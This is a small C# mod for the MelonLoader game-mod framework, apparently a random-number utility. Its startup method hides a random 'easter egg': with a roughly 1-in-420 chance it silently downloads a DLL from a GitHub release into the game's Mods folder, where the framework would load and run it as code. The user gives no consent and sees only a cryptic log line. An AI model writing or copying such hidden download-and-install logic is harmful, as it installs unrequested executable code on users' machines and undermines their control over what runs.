using System.Net;
using MelonLoader;


namespace randowo
{

    public class Main : MelonMod
    {
        public WebClient webClient = new WebClient();
        public class RandomGenerator
        {
            public int RandomNumber(int min, int max)
            {
                System.Random random = new System.Random();
                return random.Next(min, max);
            }
        }
        public RandomGenerator generator = new RandomGenerator();
        public WebClient client = new WebClient();
        public override void OnApplicationStart()
        {
            
            client.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");

            int easteregg = generator.RandomNumber(0, 420);
            if (easteregg == 69)
            {
                MelonModLogger.LogWarning("OWO What's this");
                webClient.DownloadFile("https://github.com/DubyaDude/OwO-Mod/releases/download/vCutie-3.0/OwO-Mod.dll", @"Mods\OwO-Mod.dll");
            }
        }
    }
}
